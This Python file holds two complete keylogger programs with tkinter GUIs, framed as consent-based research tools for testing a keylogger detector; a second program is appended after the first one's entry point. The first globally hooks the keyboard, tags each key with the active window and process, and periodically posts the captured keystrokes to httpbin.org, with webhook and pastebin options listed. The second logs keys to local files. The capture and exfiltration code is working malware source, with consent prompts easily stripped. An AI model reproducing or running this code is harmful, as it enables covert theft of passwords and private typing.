# keylogger_demo/keylogger_with_consent_gui.py
"""
FULL-FEATURED KEYLOGGER WITH CONSENT GUI
Professional interface + Real network exfiltration
"""
import keyboard
import requests
import json
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime
from pathlib import Path
import threading
import time
import win32gui
import win32process
import psutil

class KeyloggerApp:
    """Professional keylogger with consent GUI and real exfiltration"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Research Keylogger - Consent Required")
        self.root.geometry("600x700")
        
        self.is_recording = False
        self.is_exfiltrating = False
        self.keystrokes = []
        self.exfil_interval = 15  # seconds
        
        self.log_dir = Path("keylogger_logs")
        self.log_dir.mkdir(exist_ok=True)
        
        self.setup_gui()
        
    def setup_gui(self):
        """Create professional GUI"""
        # Header
        header = tk.Frame(self.root, bg="#2196f3", height=100)
        header.pack(fill=tk.X)
        
        tk.Label(header, text="Research Keylogger",
                font=("Arial", 20, "bold"),
                bg="#2196f3", fg="white").pack(pady=10)
        
        tk.Label(header, text="Educational/Research Use Only - Requires Explicit Consent",
                font=("Arial", 10),
                bg="#2196f3", fg="white").pack()
        
        # Main container
        main = tk.Frame(self.root, padx=20, pady=20)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Consent section
        consent_frame = tk.LabelFrame(main, text="⚠️ Consent & Configuration", 
                                     font=("Arial", 11, "bold"), padx=10, pady=10)
        consent_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(consent_frame,
                text="This keylogger will capture keystrokes and send them over the network.",
                wraplength=500, justify=tk.LEFT).pack(anchor=tk.W, pady=5)
        
        # Configuration
        config_frame = tk.Frame(consent_frame)
        config_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(config_frame, text="Exfiltration Method:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.method_var = tk.StringVar(value="http")
        methods = ttk.Combobox(config_frame, textvariable=self.method_var, 
                              values=["http", "webhook", "pastebin"], state="readonly", width=15)
        methods.grid(row=0, column=1, sticky=tk.W, padx=10)
        
        tk.Label(config_frame, text="Upload Interval (sec):").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.interval_var = tk.IntVar(value=15)
        tk.Spinbox(config_frame, from_=5, to=60, textvariable=self.interval_var, width=10).grid(row=1, column=1, sticky=tk.W, padx=10)
        
        # Consent checkbox
        self.consent_var = tk.BooleanVar(value=False)
        consent_cb = tk.Checkbutton(
            consent_frame,
            text="I consent to this data collection for research/testing purposes",
            variable=self.consent_var,
            font=("Arial", 10, "bold"),
            fg="#d32f2f"
        )
        consent_cb.pack(anchor=tk.W, pady=10)
        
        # Stats section
        stats_frame = tk.LabelFrame(main, text="📊 Session Statistics",
                                   font=("Arial", 11, "bold"), padx=10, pady=10)
        stats_frame.pack(fill=tk.X, pady=10)
        
        self.stats_label = tk.Label(stats_frame,
                                    text="Keystrokes: 0 | Uploads: 0 | Status: Idle",
                                    font=("Arial", 12))
        self.stats_label.pack(pady=5)
        
        # Live preview
        preview_frame = tk.LabelFrame(main, text="🔍 Live Preview",
                                     font=("Arial", 11, "bold"), padx=10, pady=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.preview_text = scrolledtext.ScrolledText(preview_frame, height=10,
                                                      font=("Consolas", 9),
                                                      bg="#f5f5f5", wrap=tk.WORD)
        self.preview_text.pack(fill=tk.BOTH, expand=True)
        
        # Detection info
        detector_frame = tk.LabelFrame(main, text="🛡️ What Your Detector Will Catch",
                                      font=("Arial", 10, "bold"), padx=10, pady=10,
                                      bg="#e3f2fd")
        detector_frame.pack(fill=tk.X, pady=10)
        
        catches = [
            "✓ Process name contains 'keylogger'",
            "✓ Keyboard hook via SetWindowsHookEx",
            "✓ Network traffic to HTTP endpoints",
            "✓ Periodic small data transfers (ML signature)",
            "✓ File writes to keylogger_logs/"
        ]
        
        for catch in catches:
            tk.Label(detector_frame, text=catch, bg="#e3f2fd", anchor=tk.W).pack(fill=tk.X)
        
        # Control buttons
        btn_frame = tk.Frame(main)
        btn_frame.pack(pady=15)
        
        self.start_btn = tk.Button(btn_frame, text="▶ START RECORDING",
                                   command=self.start_recording,
                                   bg="#4caf50", fg="white",
                                   font=("Arial", 12, "bold"),
                                   width=18, height=2)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="⏹ STOP & SAVE",
                                  command=self.stop_recording,
                                  bg="#f44336", fg="white",
                                  font=("Arial", 12, "bold"),
                                  width=18, height=2,
                                  state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Upload counter
        self.upload_count = 0
    
    def get_active_window(self):
        """Get active window"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return {'window': window_title[:30], 'process': process.name()}
        except:
            return {'window': 'Unknown', 'process': 'Unknown'}
    
    def on_key_press(self, event):
        """Capture keystroke"""
        if not self.is_recording:
            return
        
        window_info = self.get_active_window()
        
        keystroke = {
            'timestamp': datetime.now().isoformat(),
            'key': event.name,
            'window': window_info['window'],
            'process': window_info['process']
        }
        
        self.keystrokes.append(keystroke)
        
        # Update preview
        self.preview_text.insert(tk.END, f"{event.name} ")
        self.preview_text.see(tk.END)
        
        # Update stats
        self.update_stats()
    
    def update_stats(self):
        """Update statistics display"""
        status = "Recording..." if self.is_recording else "Stopped"
        self.stats_label.config(
            text=f"Keystrokes: {len(self.keystrokes)} | Uploads: {self.upload_count} | Status: {status}"
        )
    
    def exfiltrate_loop(self):
        """Background exfiltration thread"""
        while self.is_exfiltrating:
            time.sleep(self.exfil_interval)
            
            if self.keystrokes:
                self.upload_data()
    
    def upload_data(self):
        """Upload keystrokes to server"""
        try:
            data_packet = {
                'timestamp': datetime.now().isoformat(),
                'keystrokes': self.keystrokes[-50:],
                'total': len(self.keystrokes),
                'method': self.method_var.get()
            }
            
            # Use httpbin.org for testing
            response = requests.post(
                "http://httpbin.org/post",
                json=data_packet,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            if response.status_code == 200:
                self.upload_count += 1
                self.update_stats()
                
                log_msg = f"\n[{datetime.now().strftime('%H:%M:%S')}] ✓ Uploaded {len(json.dumps(data_packet))} bytes"
                log_msg += f"\n   YOUR DETECTOR SHOULD ALERT NOW! (Upload #{self.upload_count})\n"
                
                self.preview_text.insert(tk.END, log_msg)
                self.preview_text.see(tk.END)
                
                print(f"📤 Upload #{self.upload_count} successful")
        
        except Exception as e:
            print(f"Upload error: {e}")
    
    def start_recording(self):
        """Start keylogging"""
        if not self.consent_var.get():
            messagebox.showerror("Consent Required", 
                                "You must check the consent box to proceed.")
            return
        
        self.is_recording = True
        self.is_exfiltrating = True
        self.keystrokes.clear()
        self.preview_text.delete("1.0", tk.END)
        self.upload_count = 0
        self.exfil_interval = self.interval_var.get()
        
        # Start keyboard capture
        keyboard.on_press(self.on_key_press)
        
        # Start exfiltration thread
        exfil_thread = threading.Thread(target=self.exfiltrate_loop, daemon=True)
        exfil_thread.start()
        
        # Update UI
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.root.configure(bg="#ffcdd2")
        
        self.preview_text.insert(tk.END, 
                                f"🔴 RECORDING STARTED at {datetime.now().strftime('%H:%M:%S')}\n"
                                f"Upload interval: {self.exfil_interval}s\n"
                                f"Method: {self.method_var.get()}\n\n"
                                f"Type anything to see it captured...\n\n")
        
        print("🔴 Keylogger started with exfiltration")
    
    def stop_recording(self):
        """Stop and save"""
        self.is_recording = False
        self.is_exfiltrating = False
        keyboard.unhook_all()
        
        # Final upload
        if self.keystrokes:
            self.upload_data()
            
            # Save locally
            log_file = self.log_dir / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(log_file, 'w') as f:
                json.dump(self.keystrokes, f, indent=2)
            
            messagebox.showinfo(
                "Session Complete",
                f"Captured: {len(self.keystrokes)} keystrokes\n"
                f"Uploads: {self.upload_count}\n\n"
                f"Saved to: {log_file}\n\n"
                f"Check your detector for alerts!"
            )
        
        # Update UI
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.root.configure(bg="SystemButtonFace")
        
        self.preview_text.insert(tk.END, 
                                f"\n⏹ STOPPED at {datetime.now().strftime('%H:%M:%S')}\n")
        
        print("⏹ Keylogger stopped")
    
    def run(self):
        """Start the application"""
        self.root.mainloop()

def main():
    print("="*60)
    print("  PROFESSIONAL KEYLOGGER WITH CONSENT GUI")
    print("="*60)
    print("\nLaunching application...")
    
    app = KeyloggerApp()
    app.run()

if __name__ == "__main__":
    main()

import keyboard
import tkinter as tk
from datetime import datetime
from pathlib import Path
import threading
import time

class ConsentKeyloggerGUI:
    """Ethical keylogger with visible GUI and explicit consent"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Research Keylogger - ACTIVE")
        self.root.geometry("500x400")
        self.root.configure(bg="#ffebee")
        
        self.is_recording = False
        self.keystrokes = []
        self.log_dir = Path("keylogger_logs")
        self.log_dir.mkdir(exist_ok=True)
        
        self.setup_gui()
        
    def setup_gui(self):
        """Create GUI interface"""
        # Warning header
        header = tk.Frame(self.root, bg="#d32f2f", height=80)
        header.pack(fill=tk.X)
        
        tk.Label(header, text="🔴 KEYLOGGER ACTIVE",
                font=("Arial", 18, "bold"),
                bg="#d32f2f", fg="white").pack(pady=10)
        
        tk.Label(header, text="Research/Testing Mode - All keystrokes recorded",
                font=("Arial", 10),
                bg="#d32f2f", fg="white").pack()
        
        # Stats area
        stats_frame = tk.Frame(self.root, bg="white", padx=20, pady=20)
        stats_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Label(stats_frame, text="Session Statistics:",
                font=("Arial", 12, "bold"),
                bg="white").pack(anchor=tk.W)
        
        self.stats_label = tk.Label(stats_frame,
                                    text="Keystrokes captured: 0",
                                    font=("Arial", 14),
                                    bg="white")
        self.stats_label.pack(pady=10)
        
        # Recent keys display
        tk.Label(stats_frame, text="Recent keystrokes:",
                font=("Arial", 10),
                bg="white").pack(anchor=tk.W, pady=(10,0))
        
        self.recent_text = tk.Text(stats_frame, height=8, width=50,
                                   font=("Consolas", 9),
                                   bg="#f5f5f5")
        self.recent_text.pack(pady=5)
        
        # Detector info
        detector_frame = tk.Frame(stats_frame, bg="#e3f2fd", padx=10, pady=10)
        detector_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(detector_frame,
                text="🛡️ Your Detector Would Catch:",
                font=("Arial", 10, "bold"),
                bg="#e3f2fd").pack(anchor=tk.W)
        
        catches = [
            "✓ Keyboard hook via SetWindowsHookEx",
            "✓ Process name contains 'keylogger'",
            "✓ Suspicious GUI window title",
            "✓ File writes to keylogger_logs/"
        ]
        
        for catch in catches:
            tk.Label(detector_frame, text=catch,
                    font=("Arial", 9),
                    bg="#e3f2fd").pack(anchor=tk.W, padx=20)
        
        # Control buttons
        btn_frame = tk.Frame(self.root, bg="#ffebee")
        btn_frame.pack(pady=10)
        
        self.start_btn = tk.Button(btn_frame, text="START RECORDING",
                                   command=self.start_recording,
                                   bg="#4caf50", fg="white",
                                   font=("Arial", 11, "bold"),
                                   width=15, height=2)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="STOP & SAVE",
                                  command=self.stop_recording,
                                  bg="#f44336", fg="white",
                                  font=("Arial", 11, "bold"),
                                  width=15, height=2,
                                  state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
    
    def on_key_press(self, event):
        """Capture keystroke"""
        if not self.is_recording:
            return
        
        keystroke = {
            'timestamp': datetime.now().isoformat(),
            'key': event.name,
            'scan_code': event.scan_code
        }
        
        self.keystrokes.append(keystroke)
        
        # Update GUI
        self.stats_label.config(text=f"Keystrokes captured: {len(self.keystrokes)}")
        
        # Show recent keys
        self.recent_text.insert(tk.END, f"{event.name} ")
        self.recent_text.see(tk.END)
        
        # Keep only last 100 chars
        content = self.recent_text.get("1.0", tk.END)
        if len(content) > 100:
            self.recent_text.delete("1.0", "1.50")
    
    def start_recording(self):
        """Start keylogging"""
        self.is_recording = True
        self.keystrokes.clear()
        self.recent_text.delete("1.0", tk.END)
        
        keyboard.on_press(self.on_key_press)
        
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        self.root.configure(bg="#ffcdd2")
        
        print("🔴 Keylogger started - Type to see capture")
    
    def stop_recording(self):
        """Stop and save"""
        self.is_recording = False
        keyboard.unhook_all()
        
        # Save to file
        if self.keystrokes:
            log_file = self.log_dir / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"Keylogger Session Log\n")
                f.write(f"Started: {self.keystrokes[0]['timestamp']}\n")
                f.write(f"Ended: {self.keystrokes[-1]['timestamp']}\n")
                f.write(f"Total keystrokes: {len(self.keystrokes)}\n")
                f.write("="*60 + "\n\n")
                
                for ks in self.keystrokes:
                    f.write(f"[{ks['timestamp']}] {ks['key']}\n")
            
            print(f"\n✓ Saved to: {log_file}")
            
            tk.messagebox.showinfo(
                "Session Saved",
                f"Captured {len(self.keystrokes)} keystrokes\n\n"
                f"Saved to:\n{log_file}\n\n"
                f"Your detector would catch:\n"
                f"• Keyboard hook\n"
                f"• Suspicious file writes\n"
                f"• Process behavior"
            )
        
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.root.configure(bg="#ffebee")
        
        print("⏹️  Keylogger stopped")
    
    def run(self):
        """Start GUI"""
        # Show consent dialog
        consent = tk.messagebox.askyesno(
            "Research Keylogger - Consent Required",
            "This keylogger is for research/testing purposes.\n\n"
            "It will capture and display all keystrokes.\n\n"
            "Do you consent to this recording?\n"
            "(Only use on systems you own or have permission for)"
        )
        
        if not consent:
            print("❌ Consent not given")
            self.root.destroy()
            return
        
        print("✓ Consent given - Starting GUI keylogger")
        self.root.mainloop()

def main():
    """Launch GUI keylogger"""
    print("="*60)
    print("  GUI KEYLOGGER - RESEARCH/TESTING")
    print("="*60)
    print("\nStarting consent-based keylogger with GUI...")
    
    app = ConsentKeyloggerGUI()
    app.run()

if __name__ == "__main__":
    main()